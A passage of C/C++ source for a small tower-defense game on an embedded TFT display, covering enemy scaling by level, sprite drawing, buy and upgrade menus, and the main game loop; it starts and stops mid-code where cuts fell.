  for (int i = 0; i < 6; i++) { if (lv <= pts[i + 1].lvl) { double t = (double)(lv - pts[i].lvl) / (pts[i + 1].lvl - pts[i].lvl); return (int)(pts[i].hp + t * (pts[i + 1].hp - pts[i].hp)); } }
  return 40; }
int tdEnemyCountForLevel(int lv) { if (lv <= 5) return 6 + lv; if (lv <= 10) return 11 + (lv - 5); if (lv <= 20) return 16 + (lv - 10) * 8 / 10; if (lv <= 30) return 24 + (lv - 20) * 7 / 10; if (lv <= 40) return 31 + (lv - 30) * 3 / 10; if (lv <= 60) return 34 + (lv - 40) * 6 / 20; return 40; }
float tdEnemySpeedForLevel(int lv) { float s = 0.4f + lv * 0.035f; if (s > 3.0f) s = 3.0f; return s; }
int tdEnemyRewardForLevel(int lv) { int base = 3 + lv / 4; int r = (int)(base * 0.9); if (r < 1) r = 1; return r; }
int tdLevelBonus(int lv) { int base = 25 + lv * 4; return (int)(base * 0.9); }
uint8_t tdRollEnemyType(int lv) { int r = random(100); if (lv < 3) return TD_NORMAL;
  if (lv >= 5) { int bp = (lv >= 25) ? 5 : 8; if (r < bp) return TD_BOSS; }
  if (lv >= 25 && r < 13) return TD_TANK; if (lv >= 20 && r < 22) return TD_ELITE; if (lv >= 15 && r < 32) return TD_FLY; if (lv >= 12 && r < 47) return TD_SWARM; if (lv >= 8 && r < 67) return TD_HEAVY; if (lv >= 3 && r < 87) return TD_FAST; return TD_NORMAL; }
void tdEnemyStats(uint8_t type, int baseHp, float baseSpeed, int* outHp, float* outSpeed) { switch (type) {
  case TD_NORMAL: *outHp = baseHp; *outSpeed = baseSpeed * 1.0f; break;
  case TD_FAST: *outHp = baseHp * 7 / 10; *outSpeed = baseSpeed * 1.8f; break;
  case TD_HEAVY: *outHp = (int)((int64_t)baseHp * 28 / 10); *outSpeed = baseSpeed * 0.5f; break;
  case TD_FLY: *outHp = baseHp * 9 / 10; *outSpeed = baseSpeed * 1.5f; break;
  case TD_SWARM: *outHp = baseHp * 5 / 10; *outSpeed = baseSpeed * 2.2f; break;
  case TD_TANK: *outHp = (int)((int64_t)baseHp * 40 / 10); *outSpeed = baseSpeed * 0.35f; break;
  case TD_ELITE: *outHp = (int)((int64_t)baseHp * 30 / 10); *outSpeed = baseSpeed * 1.3f; break;
  case TD_BOSS: *outHp = (int)((int64_t)baseHp * 80 / 10); *outSpeed = baseSpeed * 1.0f; break; } }
uint16_t tdEnemyColor(uint8_t type) { switch (type) { case TD_NORMAL: return TFT_GREEN; case TD_FAST: return TFT_CYAN; case TD_HEAVY: return 0x8410; case TD_FLY: return TFT_MAGENTA; case TD_SWARM: return 0xFFE0; case TD_TANK: return 0xFC00; case TD_ELITE: return 0xF81F; case TD_BOSS: return TFT_RED; } return TFT_WHITE; }
void tdDrawGrass() { tdCanvas.fillRect(0, 10, 160, 38, 0x02E0); for (int i = 0; i < 24; i++) { int gx = (i * 17 + 3) % 158; int gy = 12 + (i * 11) % 34; tdCanvas.drawPixel(gx, gy, 0x05E0); tdCanvas.drawPixel(gx + 1, gy - 1, 0x05E0); tdCanvas.drawPixel(gx - 1, gy - 1, 0x05E0); } }
void tdDrawPath() { tdCanvas.fillRect(0, TD_PATH_Y, 160, 12, 0x8200); for (int x = 0; x < 160; x += 8) tdCanvas.drawFastVLine(x, TD_PATH_Y, 12, 0x6100); tdCanvas.drawFastHLine(0, TD_PATH_Y, 160, 0xA400); tdCanvas.drawFastHLine(0, TD_PATH_Y + 11, 160, 0x4200); for (int x = 0; x < 160; x += 6) tdCanvas.drawPixel(x, TD_FLY_Y, 0x4208); tdCanvas.drawFastVLine(2, TD_PATH_Y - 7, 7, TFT_WHITE); tdCanvas.drawFastVLine(157, TD_PATH_Y - 7, 7, TFT_WHITE); }
void tdDrawTowerSprite(int cx, int cy, uint8_t type, int flash, float angle, int recoil) {
  int rec = recoil; bool fl = (flash > 0); uint16_t towerC = tdTowerColorOf(type);
  uint16_t bulletC; switch (type) { case 0: bulletC = 0xFFE0; break; case 1: bulletC = 0xFC00; break; case 2: bulletC = 0xF81F; break; case 3: bulletC = 0xFFFF; break; default: bulletC = 0xFFE0; }
  tdCanvas.fillRect(cx - 6, cy + 4, 12, 3, 0x4208); tdCanvas.fillRect(cx - 5, cy + 3, 10, 1, 0x8410);
  if (type == 0) { tdCanvas.fillCircle(cx, cy, 5, fl ? TFT_WHITE : 0x001F); tdCanvas.drawCircle(cx, cy, 5, fl ? TFT_WHITE : towerC); }
  else if (type == 1) { tdCanvas.fillRect(cx - 5, cy - 4, 10, 9, fl ? TFT_WHITE : 0x8000); tdCanvas.drawRect(cx - 5, cy - 4, 10, 9, fl ? TFT_WHITE : towerC); }
  else if (type == 2) { tdCanvas.fillRect(cx - 4, cy - 6, 8, 11, fl ? TFT_WHITE : 0x8000); tdCanvas.drawRect(cx - 4, cy - 6, 8, 11, fl ? TFT_WHITE : towerC); }
  else { tdCanvas.fillRect(cx - 5, cy - 5, 10, 10, fl ? TFT_WHITE : 0x001F); tdCanvas.drawRect(cx - 5, cy - 5, 10, 10, fl ? TFT_WHITE : towerC); }
  float ca = cosf(angle), sa = sinf(angle);
  int blen = (type == 0) ? 7 : (type == 1 ? 6 : (type == 2 ? 8 : 5));
  int bw = (type == 0) ? 2 : (type == 1 ? 3 : (type == 2 ? 1 : 3));
  int bx = cx + (int)(ca * (5 - rec)), by = cy + (int)(sa * (5 - rec));
  int ex = cx + (int)(ca * (5 + blen - rec)), ey = cy + (int)(sa * (5 + blen - rec));
  uint16_t bc = fl ? TFT_WHITE : bulletC;
  for (int i = 0; i < bw; i++) { int off = i - bw / 2; int ox = (int)(-sa * off); int oy = (int)(ca * off); tdCanvas.drawLine(bx + ox, by + oy, ex + ox, ey + oy, bc); }
  if (type == 0) tdCanvas.drawPixel(ex, ey, TFT_YELLOW);
  else if (type == 1) { tdCanvas.drawPixel(ex, ey, TFT_RED); tdCanvas.drawPixel(ex, ey - 1, TFT_YELLOW); }
  else if (type == 2) { tdCanvas.fillCircle(cx, cy - 8, 3, 0x8000); tdCanvas.fillCircle(cx, cy - 8, 1, fl ? TFT_WHITE : TFT_YELLOW); }
  else { tdCanvas.drawPixel(ex, ey, TFT_WHITE); tdCanvas.drawPixel(ex, ey - 1, TFT_CYAN); }
}
void tdDrawEnemySprite(int x, int y, uint8_t type, int hpRatio, int walkFrame, int hitFlash) {
  uint16_t outline = TFT_BLACK; uint16_t bodyC = tdEnemyColor(type);
  if (hitFlash > 0) bodyC = TFT_WHITE;
  if (type == TD_NORMAL) {
    tdCanvas.fillCircle(x+2,y-3,3,outline); tdCanvas.fillRect(x-1,y-1,7,7,outline); tdCanvas.fillRect(x-1,y+6,7,4,outline);
    tdCanvas.fillCircle(x+2,y-3,2,bodyC); tdCanvas.drawPixel(x+1,y-4,TFT_BLACK); tdCanvas.drawPixel(x+3,y-4,TFT_BLACK);
    tdCanvas.fillRect(x,y,5,5,bodyC);
    if (walkFrame==0){tdCanvas.fillRect(x,y+6,2,3,bodyC);tdCanvas.fillRect(x+3,y+6,2,1,bodyC);}
    else{tdCanvas.fillRect(x,y+6,2,1,bodyC);tdCanvas.fillRect(x+3,y+6,2,3,bodyC);}
  } else if (type == TD_FAST) {
    tdCanvas.fillCircle(x+2,y-2,3,outline); tdCanvas.fillRect(x+1,y+1,3,6,outline); tdCanvas.fillRect(x+1,y+7,3,3,outline);
    tdCanvas.fillCircle(x+2,y-2,2,bodyC); tdCanvas.drawPixel(x+2,y-3,TFT_BLACK);
    tdCanvas.fillRect(x+1,y+1,3,6,bodyC); tdCanvas.fillRect(x+1,y+7,3,3,bodyC);
  } else if (type == TD_HEAVY) {
    tdCanvas.fillCircle(x+1,y-3,3,outline); tdCanvas.fillCircle(x+6,y-3,3,outline);
    tdCanvas.fillRect(x-2,y-1,11,8,outline); tdCanvas.fillRect(x-1,y+7,4,5,outline); tdCanvas.fillRect(x+4,y+7,4,5,outline);
    tdCanvas.fillCircle(x+1,y-3,2,bodyC); tdCanvas.fillCircle(x+6,y-3,2,bodyC);
    tdCanvas.drawPixel(x,y-4,TFT_BLACK); tdCanvas.drawPixel(x+7,y-4,TFT_BLACK);
    tdCanvas.fillRect(x-1,y,9,6,bodyC); tdCanvas.drawRect(x-1,y,9,6,TFT_YELLOW);
    if (walkFrame==0){tdCanvas.fillRect(x,y+8,3,4,bodyC);tdCanvas.fillRect(x+5,y+8,3,2,bodyC);}
    else{tdCanvas.fillRect(x,y+8,3,2,bodyC);tdCanvas.fillRect(x+5,y+8,3,4,bodyC);}
  } else if (type == TD_SWARM) {
    int bob = (walkFrame==0)?0:1; int yb = y + bob;
    tdCanvas.fillCircle(x+2,yb-1,3,outline); tdCanvas.fillRect(x+1,yb+2,3,5,outline);
    tdCanvas.fillCircle(x+2,yb-1,2,bodyC); tdCanvas.drawPixel(x+1,yb-2,TFT_BLACK); tdCanvas.drawPixel(x+3,yb-2,TFT_BLACK);
    tdCanvas.fillRect(x+1,yb+2,3,5,bodyC);
    tdCanvas.drawFastVLine(x-1,yb+1,4,TFT_WHITE); tdCanvas.drawFastVLine(x+6,yb+1,4,TFT_WHITE);
  } else if (type == TD_TANK) {
    tdCanvas.fillRect(x-4,y+8,16,4,outline); tdCanvas.fillRect(x-3,y+9,14,2,0x4208);
    tdCanvas.fillRect(x-3,y-4,14,12,outline); tdCanvas.fillRect(x-2,y-3,12,10,bodyC);
    tdCanvas.fillRect(x+2,y-8,6,5,outline); tdCanvas.fillRect(x+3,y-7,4,3,0x8410);
    tdCanvas.fillRect(x+7,y-6,5,2,0x8410);
    tdCanvas.drawRect(x-2,y-3,12,10,TFT_YELLOW);
    tdCanvas.drawPixel(x+1,y,TFT_BLACK); tdCanvas.drawPixel(x+8,y,TFT_BLACK);
    if (walkFrame==0){tdCanvas.drawFastVLine(x-2,y+9,2,0x2104);tdCanvas.drawFastVLine(x+8,y+9,2,0x2104);}
    else{tdCanvas.drawFastVLine(x+2,y+9,2,0x2104);tdCanvas.drawFastVLine(x+12,y+9,2,0x2104);}
  } else if (type == TD_ELITE) {
    int bob = (walkFrame==0)?0:1; int yb = y + bob;
    tdCanvas.drawCircle(x+2,yb-5,6,TFT_YELLOW);
    tdCanvas.fillCircle(x+2,yb-3,3,outline); tdCanvas.fillCircle(x+2,yb-3,2,bodyC);
    tdCanvas.drawPixel(x+1,yb-4,TFT_WHITE); tdCanvas.drawPixel(x+3,yb-4,TFT_WHITE);
    tdCanvas.fillRect(x-1,yb,7,10,outline); tdCanvas.fillRect(x,yb+1,5,8,bodyC); tdCanvas.drawRect(x,yb+1,5,8,TFT_YELLOW);
    tdCanvas.fillRect(x,yb+11,2,3,bodyC); tdCanvas.fillRect(x+3,yb+11,2,3,bodyC);
    tdCanvas.drawFastVLine(x+7,yb-4,14,TFT_YELLOW); tdCanvas.fillCircle(x+7,yb-5,2,TFT_MAGENTA);
  } else if (type == TD_FLY) {
    int bob = (walkFrame==0)?0:1; int by2 = y - 8 + bob;
    tdCanvas.fillTriangle(x-3,by2+6,x+2,by2-2,x+7,by2+6,outline); tdCanvas.fillRect(x-3,by2+6,11,3,outline);
    tdCanvas.fillTriangle(x-2,by2+5,x+2,by2-1,x+6,by2+5,bodyC); tdCanvas.fillRect(x-2,by2+5,9,2,bodyC);
    tdCanvas.drawPixel(x+2,by2,TFT_WHITE); tdCanvas.drawPixel(x+2,by2+9,TFT_MAGENTA); tdCanvas.drawPixel(x+2,by2+10,0x8010);
  } else if (type == TD_BOSS) {
    int bob = (walkFrame==0)?0:1; int by2 = y - 12 + bob;
    tdCanvas.fillTriangle(x-3,by2,x-1,by2-5,x+1,by2,TFT_YELLOW);
    tdCanvas.fillTriangle(x+1,by2,x+3,by2-6,x+5,by2,TFT_YELLOW);
    tdCanvas.fillTriangle(x+5,by2,x+7,by2-5,x+9,by2,TFT_YELLOW);
    tdCanvas.fillRect(x-3,by2,12,2,TFT_YELLOW);
    tdCanvas.fillCircle(x+3,by2+5,6,outline); tdCanvas.fillCircle(x+3,by2+5,5,bodyC);
    tdCanvas.fillRect(x,by2+4,2,3,TFT_BLACK); tdCanvas.fillRect(x+5,by2+4,2,3,TFT_BLACK);
    tdCanvas.drawPixel(x+1,by2+5,TFT_RED); tdCanvas.drawPixel(x+6,by2+5,TFT_RED);
    tdCanvas.drawFastHLine(x+1,by2+8,5,TFT_BLACK);
    tdCanvas.drawPixel(x+1,by2+9,TFT_WHITE); tdCanvas.drawPixel(x+3,by2+9,TFT_WHITE); tdCanvas.drawPixel(x+5,by2+9,TFT_WHITE);
    tdCanvas.fillRect(x-3,by2+11,13,9,outline); tdCanvas.fillRect(x-2,by2+12,11,7,bodyC); tdCanvas.drawRect(x-2,by2+12,11,7,TFT_YELLOW);
    if (walkFrame==0){tdCanvas.fillRect(x-2,by2+20,4,5,bodyC);tdCanvas.fillRect(x+4,by2+20,4,3,bodyC);}
    else{tdCanvas.fillRect(x-2,by2+20,4,3,bodyC);tdCanvas.fillRect(x+4,by2+20,4,5,bodyC);}
  }
  int barY = (type==TD_FLY) ? (y-14) : (y-10);
  if (type == TD_BOSS) barY = y - 22;
  int barW = (type==TD_BOSS) ? 16 : 9;
  int barX = (type==TD_BOSS) ? (x-4) : (x-2);
  tdCanvas.drawRect(barX,barY,barW+2,4,TFT_BLACK);
  int fill = hpRatio * barW / 100;
  uint16_t hpC = (hpRatio>60)?TFT_GREEN:(hpRatio>30?TFT_YELLOW:TFT_RED);
  if (fill>0) tdCanvas.fillRect(barX+1,barY+1,fill,2,hpC);
}
void tdDrawBulletSprite(float x, float y, uint8_t type) {
  int ix = (int)x, iy = (int)y;
  if (type == 0) { tdCanvas.drawPixel(ix, iy, TFT_WHITE); tdCanvas.drawPixel(ix - 1, iy, TFT_YELLOW); }
  else if (type == 1) { tdCanvas.fillCircle(ix, iy, 2, TFT_ORANGE); tdCanvas.drawPixel(ix, iy, TFT_YELLOW); }
  else if (type == 2) { tdCanvas.drawFastHLine(ix - 3, iy, 6, 0xF81F); tdCanvas.drawPixel(ix + 3, iy, TFT_WHITE); }
  else { tdCanvas.fillCircle(ix, iy, 2, TFT_CYAN); tdCanvas.drawPixel(ix, iy, TFT_WHITE); }
}
void tdDrawExplosionSprite(int x, int y, int age) {
  if (age < 2) { tdCanvas.fillCircle(x, y, 4, TFT_WHITE); tdCanvas.drawCircle(x, y, 6, TFT_YELLOW); }
  else if (age < 4) { tdCanvas.fillCircle(x, y, 3, TFT_YELLOW); tdCanvas.drawCircle(x, y, 5, TFT_ORANGE); }
  else if (age < 6) { tdCanvas.drawCircle(x, y, 4, TFT_RED); tdCanvas.drawCircle(x, y, 3, TFT_ORANGE); }
  else if (age < 8) { tdCanvas.drawCircle(x, y, 2, 0x8410); }
}
void tdDrawHUD() {
  tdCanvas.fillRect(0, 0, 160, 10, TFT_BLACK);
  char buf[16];
  tdCanvas.setTextColor(TFT_CYAN, TFT_BLACK); snprintf(buf,sizeof(buf),"LV%d",tdLevel); tdCanvas.drawString(buf,1,0);
  int hx = 26; tdCanvas.fillCircle(hx,4,2,TFT_RED); tdCanvas.fillCircle(hx+3,4,2,TFT_RED); tdCanvas.fillTriangle(hx-2,5,hx+5,5,hx+1,9,TFT_RED);
  tdCanvas.setTextColor(TFT_WHITE, TFT_BLACK); snprintf(buf,sizeof(buf),"%d",tdHp); tdCanvas.drawString(buf,hx+7,0);
  int gx = 58; tdCanvas.fillCircle(gx,4,3,TFT_YELLOW); tdCanvas.drawCircle(gx,4,3,0x8400);
  snprintf(buf,sizeof(buf),"%d",tdGold); tdCanvas.drawString(buf,gx+5,0);
  snprintf(buf,sizeof(buf),"E:%d",tdRemaining); tdCanvas.drawString(buf,120,0);
}
bool tdSpawnEnemy() {
  for (int i = 0; i < TD_MAX_ENEMIES; i++) {
    if (!tdEnemies[i].active) {
      uint8_t t = tdRollEnemyType(tdLevel);
      int baseHp = tdEnemyHpForLevel(tdLevel);
      float baseSpd = tdEnemySpeedForLevel(tdLevel);
      int hp; float spd; tdEnemyStats(t, baseHp, baseSpd, &hp, &spd);
      tdEnemies[i].type = t; tdEnemies[i].x = -7;
      tdEnemies[i].maxHp = hp; tdEnemies[i].hp = hp; tdEnemies[i].speed = spd;
      tdEnemies[i].reward = tdEnemyRewardForLevel(tdLevel);
      if (t == TD_BOSS) tdEnemies[i].reward *= 8;
      else if (t == TD_TANK) tdEnemies[i].reward *= 4;
      else if (t == TD_ELITE) tdEnemies[i].reward *= 3;
      else if (t == TD_SWARM) tdEnemies[i].reward = tdEnemies[i].reward * 8 / 10;
      tdEnemies[i].walkFrame = 0; tdEnemies[i].hitFlash = 0; tdEnemies[i].active = true;
      return true;
    }
  }
  return false;
}
void tdSpawnBullet(int sx, int sy, uint8_t type, float tx, float ty, int pierce, bool explosive, int damage) {
  for (int i = 0; i < TD_MAX_BULLETS; i++) {
    if (!tdBullets[i].active) {
      tdBullets[i].x = sx; tdBullets[i].y = sy; tdBullets[i].prevX = sx; tdBullets[i].prevY = sy;
      float dx = tx - sx, dy = ty - sy;
      float len = sqrtf(dx * dx + dy * dy); if (len < 0.01f) len = 1.0f;
      float spd = (type == 0) ? 7.0f : (type == 1 ? 6.0f : (type == 2 ? 9.0f : 6.0f));
      tdBullets[i].vx = dx / len * spd; tdBullets[i].vy = dy / len * spd;
      tdBullets[i].type = type; tdBullets[i].life = 80;
      tdBullets[i].pierce = pierce; tdBullets[i].explosive = explosive; tdBullets[i].damage = damage;
      tdBullets[i].active = true;
      return;
    }
  }
}
void tdSpawnExplosion(int x, int y) { for (int i = 0; i < TD_MAX_EXPLOS; i++) if (!tdExplosions[i].active) { tdExplosions[i].x = x; tdExplosions[i].y = y; tdExplosions[i].age = 0; tdExplosions[i].active = true; return; } }
void tdSpawnParticles(int x, int y, uint16_t color, int count) {
  int spawned = 0;
  for (int i = 0; i < TD_MAX_PARTS && spawned < count; i++) {
    if (!tdParticles[i].active) {
      tdParticles[i].x = x; tdParticles[i].y = y;
      int angle = random(360); float rad = angle * 3.14159f / 180.0f; int spd = 1 + random(2);
      tdParticles[i].vx = (int)(cosf(rad) * spd); tdParticles[i].vy = (int)(sinf(rad) * spd);
      tdParticles[i].life = 200 + random(200); tdParticles[i].color = color; tdParticles[i].active = true;
      spawned++;
    }
  }
}
void tdResetAll() {
  for (int i = 0; i < TD_MAX_ENEMIES; i++) { tdEnemies[i].active = false; tdEnemies[i].x = 0; tdEnemies[i].hp = 0; tdEnemies[i].maxHp = 0; tdEnemies[i].speed = 0; tdEnemies[i].reward = 0; tdEnemies[i].walkFrame = 0; tdEnemies[i].hitFlash = 0; tdEnemies[i].type = TD_NORMAL; }
  for (int i = 0; i < TD_MAX_TOWERS; i++) { tdTowers[i].active = false; tdTowers[i].cx = i * 40 + 20; tdTowers[i].cy = TD_TOWER_ROW1; tdTowers[i].type = 0; tdTowers[i].damage = 4; tdTowers[i].cooldownMs = 250; tdTowers[i].range = 65; tdTowers[i].cooldown = 0; tdTowers[i].pierce = 0; tdTowers[i].explosive = false; tdTowers[i].flashFrames = 0; tdTowers[i].recoil = 0; tdTowers[i].angle = 0; }
  for (int i = 0; i < TD_MAX_BULLETS; i++) tdBullets[i].active = false;
  for (int i = 0; i < TD_MAX_EXPLOS; i++) tdExplosions[i].active = false;
  for (int i = 0; i < TD_MAX_PARTS; i++) tdParticles[i].active = false;
  for (int i = 0; i < TD_MAX_TOWERS; i++) { tdBuildCount[i] = 0; for (int j = 0; j < 6; j++) tdUpgradeCount[i][j] = 0; }
  tdLevel = 1; tdGold = 150; tdHp = 10; tdMaxHp = 10; tdCursor = 0; tdRemaining = 0; tdSpawned = 0; tdSpawnTotal = 0; tdSpawnTimer = 0; tdSpawnInterval = 0; tdGameStart = millis();
}
void tdShowBuyMenu() {
  int sel = 0; const int TOTAL = 4; bool hasTower = tdTowers[tdCursor].active;
  while (true) {
    tdCanvas.fillSprite(TFT_BLACK);
    if (hasTower) { tdCanvas.setTextColor(TFT_ORANGE, TFT_BLACK); tdCanvas.drawCentreString("REPLACE (50% back)", 80, 2, 1); }
    else { tdCanvas.setTextColor(TFT_YELLOW, TFT_BLACK); tdCanvas.drawCentreString("== BUY TOWER ==", 80, 2, 1); }
    char buf[32]; snprintf(buf, sizeof(buf), "Gold: %d", tdGold);
    tdCanvas.setTextColor(TFT_CYAN, TFT_BLACK); tdCanvas.drawString(buf, 2, 13);
    tdCanvas.drawFastHLine(2, 22, 156, 0x4208);
    for (int i = 0; i < TOTAL; i++) {
      int y = 26 + i * 12;
      int c = tdTowerCost(tdCursor, i); bool ok = (tdGold >= c);
      uint16_t col = (i == sel) ? TFT_YELLOW : (ok ? TFT_WHITE : 0x4208);
      tdCanvas.setTextColor(col, TFT_BLACK);
      if (i == sel) tdCanvas.drawString(">", 2, y);
      tdCanvas.drawString(tdTowerName(i), 14, y);
      char pb[8]; snprintf(pb, sizeof(pb), "$%d", c);
      int pw = strlen(pb) * 6; tdCanvas.drawString(pb, 158 - pw, y);
    }
    tdCanvas.setTextColor(TFT_DARKGREY, TFT_BLACK); tdCanvas.drawCentreString("L:OK   R:Back", 80, 74, 1);
    tdCanvas.pushSprite(0, 0);
    char k = tdMenuKey();
    if (k == 'U') sel = (sel + TOTAL - 1) % TOTAL;
    else if (k == 'D') sel = (sel + 1) % TOTAL;
    else if (k == 'L') {
      int cost = tdTowerCost(tdCursor, sel);
      if (tdGold >= cost) {
        if (tdTowers[tdCursor].active) { tdGold += tdTowerBaseCost(tdTowers[tdCursor].type) / 2; tdSpawnParticles(tdTowers[tdCursor].cx, tdTowers[tdCursor].cy, TFT_ORANGE, 6); }
        tdGold -= cost;
        tdBuildCount[tdCursor]++;
        for (int j = 0; j < 6; j++) tdUpgradeCount[tdCursor][j] = 0;
        tdTowers[tdCursor].cx = tdCursor * 40 + 20; tdTowers[tdCursor].cy = TD_TOWER_ROW1;
        tdApplyTowerDefaults(tdCursor, sel); tdTowers[tdCursor].active = true;
        delay(300); return;
      }
    }
    else if (k == 'R') { delay(250); return; }
    delay(20);
  }
}
void tdShowUpgradeMenu() {
  if (!tdTowers[tdCursor].active) return;
  TdTower* t = &tdTowers[tdCursor];
  int sel = 0; const int TOTAL = 6;
  const char* names[TOTAL] = {"DMG +20%", "Rate -10%", "Range +10", "Pierce +1", "Explosive", "Sell 50%"};
  while (true) {
    tdCanvas.fillSprite(TFT_BLACK);
    tdCanvas.setTextColor(TFT_YELLOW, TFT_BLACK);
    char hdr[24]; snprintf(hdr, sizeof(hdr), "== %s ==", tdTowerName(t->type));
    tdCanvas.drawCentreString(hdr, 80, 2, 1);
    int tLv = 1; for (int j = 0; j < 6; j++) tLv += tdUpgradeCount[tdCursor][j];
    char buf[48]; snprintf(buf, sizeof(buf), "Lv%d D:%d CD:%d R:%d", tLv, t->damage, t->cooldownMs, t->range);
    tdCanvas.setTextColor(TFT_GREEN, TFT_BLACK); tdCanvas.drawString(buf, 2, 13);
    snprintf(buf, sizeof(buf), "$%d", tdGold);
    tdCanvas.setTextColor(TFT_YELLOW, TFT_BLACK);
    int gw = strlen(buf) * 6; tdCanvas.drawString(buf, 158 - gw, 13);
    tdCanvas.drawFastHLine(2, 22, 156, 0x4208);
    for (int i = 0; i < TOTAL; i++) {
      int y = 24 + i * 8;
      int c = tdUpgradeCost(tdCursor, i);
      bool ok = (i == TOTAL - 1) ? true : (tdGold >= c);
      uint16_t col = (i == sel) ? TFT_YELLOW : (ok ? TFT_WHITE : 0x4208);
      tdCanvas.setTextColor(col, TFT_BLACK);
      if (i == sel) tdCanvas.drawString(">", 2, y);
      tdCanvas.drawString(names[i], 12, y);
      char pb[8]; snprintf(pb, sizeof(pb), "$%d", c);
      int pw = strlen(pb) * 6; tdCanvas.drawString(pb, 158 - pw, y);
    }
    tdCanvas.setTextColor(TFT_DARKGREY, TFT_BLACK); tdCanvas.drawCentreString("L:OK   R:Back", 80, 72, 1);
    tdCanvas.pushSprite(0, 0);
    char k = tdMenuKey();
    if (k == 'U') sel = (sel + TOTAL - 1) % TOTAL;
    else if (k == 'D') sel = (sel + 1) % TOTAL;
    else if (k == 'L') {
      if (sel == TOTAL - 1) { tdGold += tdTowerBaseCost(t->type) / 2; t->active = false; delay(300); return; }
      int c = tdUpgradeCost(tdCursor, sel);
      if (tdGold >= c) {
        tdGold -= c; tdUpgradeCount[tdCursor][sel]++;
        switch (sel) { case 0: t->damage = t->damage * 120 / 100 + 1; break; case 1: t->cooldownMs = t->cooldownMs * 90 / 100; if (t->cooldownMs < 60) t->cooldownMs = 60; break; case 2: t->range += 10; break; case 3: t->pierce++; break; case 4: t->explosive = true; break; }
        delay(200);
      }
    }
    else if (k == 'R') { delay(250); return; }
    delay(20);
  }
}
void tdGamePlay() {
  tdResetAll();
  if (!tdCanvas.created()) { tdCanvas.createSprite(160, 80); tdCanvas.setTextSize(1); }
  unsigned long lastFrame = millis();
  while (true) {
    tdSpawnTotal = tdEnemyCountForLevel(tdLevel);
    tdRemaining = tdSpawnTotal; tdSpawned = 0;
    tdSpawnInterval = 900 - tdLevel * 15; if (tdSpawnInterval < 250) tdSpawnInterval = 250;
    tdSpawnTimer = millis();
    bool levelClear = false; int walkTick = 0;
    while (!levelClear) {
      unsigned long now = millis();
      if (now - lastFrame < 20) { delay(5); continue; }
      lastFrame = now;
      if (tdSpawned < tdSpawnTotal && now - tdSpawnTimer > tdSpawnInterval) { if (tdSpawnEnemy()) { tdSpawned++; tdSpawnTimer = now; } }
      walkTick++;
      for (int i = 0; i < TD_MAX_ENEMIES; i++) {
        if (!tdEnemies[i].active) continue;
        tdEnemies[i].x += tdEnemies[i].speed;
        if (tdEnemies[i].hitFlash > 0) tdEnemies[i].hitFlash--;
        if (walkTick % 5 == 0) tdEnemies[i].walkFrame = 1 - tdEnemies[i].walkFrame;
        if (tdEnemies[i].x > 160) {
          tdEnemies[i].active = false; tdHp--; tdRemaining--;
          if (tdHp <= 0) {
            unsigned long elapsed = (millis() - tdGameStart) / 1000;
            if (tdLevel > tdData.bestLevel) tdData.bestLevel = tdLevel;
            tdSave(); gameReward(tdLevel / 2 + 1); pet2TaskAdd(6, 1);
            tdCanvas.deleteSprite();
            clearAll();
            tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawCentreString("GAME OVER", 80, 10, 1);
            tft.setTextColor(TFT_WHITE, TFT_BLACK);
            tft.drawString("Level: " + String(tdLevel), 4, 30);
            tft.drawString("Gold : " + String(tdGold), 4, 42);
            char buf[24]; snprintf(buf, sizeof(buf), "Time: %lum %lus", elapsed / 60, elapsed % 60); tft.drawString(buf, 4, 54);
            while (true) { char kk = getKey(); if (kk == 'R' || kk == 'E') break; delay(20); }
            tdResetAll(); return;
          }
        }
      }
      for (int i = 0; i < TD_MAX_TOWERS; i++) {
        TdTower* t = &tdTowers[i];
        if (!t->active) continue;
        t->cx = i * 40 + 20; t->cy = TD_TOWER_ROW1;
        if (t->flashFrames > 0) t->flashFrames--;
        if (t->recoil > 0) t->recoil--;
        int bestIdx = -1, bestD2 = 999999999;
        for (int j = 0; j < TD_MAX_ENEMIES; j++) {
          if (!tdEnemies[j].active) continue;
          int ex = (int)tdEnemies[j].x + 2;
          int ey = (tdEnemies[j].type == TD_FLY) ? (TD_FLY_Y - 2) : (TD_PATH_Y + 4);
          int dx = ex - t->cx, dy = ey - t->cy; int d2 = dx * dx + dy * dy;
          if (d2 < bestD2) { bestD2 = d2; bestIdx = j; }
        }
        if (bestIdx >= 0) {
          int ex = (int)tdEnemies[bestIdx].x + 2;
          int ey = (tdEnemies[bestIdx].type == TD_FLY) ? (TD_FLY_Y - 2) : (TD_PATH_Y + 4);
          int dx0 = ex - t->cx, dy0 = ey - t->cy; int d2 = dx0 * dx0 + dy0 * dy0;
          float bulletSpd = (t->type == 0) ? 7.0f : (t->type == 1 ? 6.0f : (t->type == 2 ? 9.0f : 6.0f));
          float dist = sqrtf((float)d2); float flightFrames = dist / bulletSpd;
          float futureX = ex + tdEnemies[bestIdx].speed * flightFrames;
          if (futureX > 165) futureX = 165;
          if (futureX < -10) futureX = -10;
          int dx = (int)futureX - t->cx, dy = ey - t->cy;
          t->angle = atan2f((float)dy, (float)dx);
          if (d2 <= t->range * t->range && t->cooldown <= 0) { tdSpawnBullet(t->cx, t->cy, t->type, futureX, (float)ey, t->pierce, t->explosive, t->damage); t->cooldown = t->cooldownMs; t->recoil = 2; }
        }
        if (t->cooldown > 0) { t->cooldown -= 20; if (t->cooldown < 0) t->cooldown = 0; }
      }
      for (int i = 0; i < TD_MAX_BULLETS; i++) {
        if (!tdBullets[i].active) continue;
        tdBullets[i].prevX = tdBullets[i].x; tdBullets[i].prevY = tdBullets[i].y;
        tdBullets[i].x += tdBullets[i].vx; tdBullets[i].y += tdBullets[i].vy; tdBullets[i].life--;
        if (tdBullets[i].life <= 0 || tdBullets[i].x < 0 || tdBullets[i].x > 160 || tdBullets[i].y < 0 || tdBullets[i].y > 80) { tdBullets[i].active = false; continue; }
        bool hit = false;
        for (int step = 0; step <= 3 && !hit; step++) {
          float t_ = step / 3.0f;
          float sx = tdBullets[i].prevX + (tdBullets[i].x - tdBullets[i].prevX) * t_;
          float sy = tdBullets[i].prevY + (tdBullets[i].y - tdBullets[i].prevY) * t_;
          for (int j = 0; j < TD_MAX_ENEMIES; j++) {
            if (!tdEnemies[j].active) continue;
            int ex = (int)tdEnemies[j].x + 2;
            int ey = (tdEnemies[j].type == TD_FLY) ? (TD_FLY_Y - 2) : (TD_PATH_Y + 4);
            int dx = (int)sx - ex, dy = (int)sy - ey;
            if (dx * dx + dy * dy < 64) {
              int dmg = tdBullets[i].damage;
              tdEnemies[j].hp -= dmg; tdEnemies[j].hitFlash = 3;
              bool kill = (tdEnemies[j].hp <= 0);
